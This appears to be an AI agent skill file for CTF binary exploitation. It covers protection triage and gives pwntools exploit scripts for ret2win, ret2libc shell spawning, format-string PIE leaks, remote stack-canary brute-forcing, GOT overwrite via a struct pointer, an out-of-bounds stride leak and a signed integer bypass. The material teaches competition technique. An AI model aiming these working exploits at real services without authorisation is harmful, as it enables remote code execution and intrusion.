---
name: ctf-pwn-basics
description: "CTF binary exploitation. Systematic triage: checksec, protections matrix, technique selection. Stack BOF, ret2win, stack alignment, cyclic offset, ret2libc, canary brute-force on forking servers, struct pointer overwrite, OOB read via stride, signed integer bypass, GOT overwrite via write-what-where. Routes to ctf-pwn-heap/rop/format-string/kernel based on detected protections. Triggers: 'buffer overflow', 'ret2win', 'stack overflow', 'pwn', 'bof', 'binary exploit', 'stack smashing', 'overflow offset', 'cyclic pattern', 'canary bypass', 'checksec', 'NX', 'PIE', 'RELRO'."
version: 2.0.0
---

# CTF Pwn — Binary Exploitation

Work top-to-bottom. Triage before writing a single line of exploit code.

---

## Phase 0: Triage

```bash
BINARY="./challenge"

file $BINARY
checksec --file=$BINARY
strings $BINARY | grep -iE "flag|win|secret|shell|system|execve" | head -20
objdump -d $BINARY | grep -E "<win|<flag|<shell|<secret|<backdoor"
ldd $BINARY 2>/dev/null
```

Protections matrix — determines which technique applies:

| Protection | Value | Attack surface |
|---|---|---|
| Canary | No | Direct ret overwrite |
| Canary | Yes | Brute (fork server) or leak before overwrite |
| NX | No | Shellcode injection to stack/heap |
| NX | Yes | ROP / ret2libc / ret2plt |
| PIE | No | Hardcoded gadget addresses |
| PIE | Yes | Need leak first → compute base offset |
| RELRO | No | GOT overwrite |
| RELRO | Partial | GOT overwrite for non-resolved entries |
| RELRO | Full | No GOT overwrite → target other writable regions |
| ASLR | Off | Static addresses |
| ASLR | On | Leak required (format string, puts@GOT, etc.) |

Routing decision after triage:

```
No canary, No PIE, No NX           → ret2shellcode (Phase 2)
No canary, No PIE, NX              → ret2win / ret2libc (Phase 3)
No canary, PIE, NX                 → leak PIE base → ret2win/ROP (Phase 3 + 4)
Canary, fork server                → canary brute (Phase 6)
Heap calls (malloc/free/calloc)    → ctf-pwn-heap
printf/scanf format specifiers     → ctf-pwn-format-string
Kernel module, /proc/kallsyms      → ctf-pwn-kernel
seccomp, vm2, browser              → ctf-pwn-sandbox
Complex ROP chain needed           → ctf-pwn-rop
```

---

## Phase 1: Setup

```bash
pip install pwntools --break-system-packages
apt-get install -y gdb patchelf binutils
python3 -m pip install pwndbg

gdb $BINARY
(gdb) source /path/to/pwndbg/gdbinit.py
```

pwntools template:

```python
from pwn import *

context.binary = elf = ELF('./challenge')
context.arch   = 'amd64'
context.log_level = 'info'

gs = """
b *main
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gs)
    if args.REMOTE:
        return remote('target.ctf', 1337)
    return process(elf.path)

p = start()
```

---

## Phase 2: Find Overflow Offset

```python
from pwn import *

elf = ELF('./challenge')
p = process(elf.path)

p.sendline(cyclic(300))
p.wait()

core = p.corefile
rsp_val = core.rsp
offset = cyclic_find(core.read(rsp_val, 4))
print(f"offset = {offset}")
```

Manual with GDB:
```bash
python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(300))" > pattern.txt
gdb -q ./challenge
(gdb) run < pattern.txt
(gdb) info registers rsp
(gdb) python from pwn import *; print(cyclic_find(0x61616164))
```

---

## Phase 3: ret2win

```python
from pwn import *

context.binary = elf = ELF('./challenge')
p = process(elf.path)

OFFSET = 72
ret    = next(elf.search(asm('ret')))
win    = elf.symbols['win']

payload = flat(
    b'A' * OFFSET,
    ret,
    win
)

p.sendline(payload)
p.interactive()
```

ret2win with arguments:

```python
from pwn import *

context.binary = elf = ELF('./challenge')
rop = ROP(elf)
p = process(elf.path)

OFFSET  = 72
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
win     = elf.symbols['win']

payload = flat(
    b'A' * OFFSET,
    ret,
    pop_rdi, 0xdeadbeef,
    pop_rsi, 0xcafebabe, 0x0,
    win
)

p.sendline(payload)
p.interactive()
```

---

## Phase 4: ret2libc (NX enabled, no PIE)

Leak libc base via puts(puts@GOT), then call system("/bin/sh"):

```python
from pwn import *

context.binary = elf  = ELF('./challenge')
libc              = ELF('./libc.so.6')
rop               = ROP(elf)
p                 = process(elf.path)

OFFSET  = 72
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main     = elf.symbols['main']

payload = flat(
    b'A' * OFFSET,
    pop_rdi, puts_got,
    puts_plt,
    main
)

p.sendline(payload)
p.recvuntil(b'\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
print(f"libc base = {hex(libc.address)}")

bin_sh  = next(libc.search(b'/bin/sh\x00'))
system  = libc.symbols['system']

payload2 = flat(
    b'A' * OFFSET,
    ret,
    pop_rdi, bin_sh,
    system
)

p.sendline(payload2)
p.interactive()
```

---

## Phase 5: PIE Bypass — Leak Base via Format String or GOT

```python
from pwn import *

context.binary = elf = ELF('./challenge')
p = process(elf.path)

p.sendlineafter(b'> ', b'%15$p')
leak_raw = p.recvline().strip()
leak = int(leak_raw, 16)

elf.address = leak - 0x1234
print(f"PIE base = {hex(elf.address)}")

win = elf.symbols['win']
```

Find correct format string offset:
```bash
python3 -c "
for i in range(1, 50):
    print(f'%{i}\$p')
" | while read fmt; do
    echo -n "$fmt: "
    echo "$fmt" | ./challenge 2>/dev/null | head -1
done
```

---

## Phase 6: Stack Canary Brute-Force (Forking Server)

```python
from pwn import *

HOST, PORT = 'target.ctf', 1337
OFFSET = 64

def probe(payload: bytes) -> bool:
    try:
        p = remote(HOST, PORT, timeout=3)
        p.sendline(payload)
        data = p.recv(timeout=1)
        p.close()
        return len(data) > 0
    except EOFError:
        return False
    except Exception:
        return False

canary = b'\x00'
for pos in range(1, 8):
    for guess in range(256):
        test = b'A' * OFFSET + canary + bytes([guess])
        if probe(test):
            canary += bytes([guess])
            print(f"canary[{pos}] = {guess:#04x}")
            break
    else:
        print(f"failed at byte {pos}")
        break

print(f"full canary: {canary.hex()}")

p = remote(HOST, PORT)
WIN = 0xdeadbeef
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(WIN)
p.sendline(payload)
p.interactive()
```

---

## Phase 7: Struct Pointer Overwrite (Write-What-Where)

```python
from pwn import *

context.binary = elf = ELF('./challenge')
p = process(elf.path)

GOT_PUTS = elf.got['puts']
WIN      = elf.symbols['win']

STRUCT_BUF_SIZE = 36

def create(name: bytes, grade: int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'name: ', name)
    p.sendlineafter(b'grade: ', str(grade).encode())

def edit_name(idx: int, data: bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.send(data)

def edit_grade(idx: int, val: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'grade: ', str(val).encode())

create(b'AAAA', 5)
edit_name(0, b'A' * STRUCT_BUF_SIZE + p64(GOT_PUTS))
edit_grade(0, WIN)

p.interactive()
```

---

## Phase 8: OOB Read via Stride Leak

```python
from pwn import *

HOST, PORT = 'target.ctf', 1337

def read_stack_byte(offset: int) -> int:
    p = remote(HOST, PORT, timeout=5)
    p.sendlineafter(b'input: ', b'A' * 31)
    p.sendlineafter(b'stride: ', str(offset).encode())
    p.sendlineafter(b'count: ', b'2')
    data = p.recvline().strip()
    p.close()
    return data[1] if len(data) > 1 else 0

canary = b'\x00'
for off in range(73, 80):
    canary += bytes([read_stack_byte(off)])
print(f"canary: {canary.hex()}")

ret_bytes = b''
for off in range(88, 96):
    ret_bytes += bytes([read_stack_byte(off)])
ret_addr = u64(ret_bytes)
pie_base = ret_addr - 0x1234
print(f"PIE base: {hex(pie_base)}")
```

---

## Phase 9: Signed Integer Bypass

```python
p.sendlineafter(b'count: ', b'-1')
```

Negative value passed to `size_t` → wraps to large unsigned → bypasses `if (n > MAX)` check. Also useful for bypassing `cost * quantity` checks when `quantity` is signed.

---

## Output

Save to `.omop/ctf/<challenge>/pwn/`:
- `exploit.py` — working exploit
- `flag.txt` — captured flag

## Skill Routing

| Condition | Next skill |
|---|---|
| Heap calls (malloc/free), tcache | `ctf-pwn-heap` |
| Long ROP chain, libc gadgets | `ctf-pwn-rop` |
| `printf` / format specifier input | `ctf-pwn-format-string` |
| Kernel LPE, `/proc/kallsyms` | `ctf-pwn-kernel` |
| seccomp, vm2, browser | `ctf-pwn-sandbox` |
| VM interpreter, JIT, custom opcode | `ctf-pwn-advanced-exploits` |
| Need to understand binary first | `ctf-reverse-tools` |
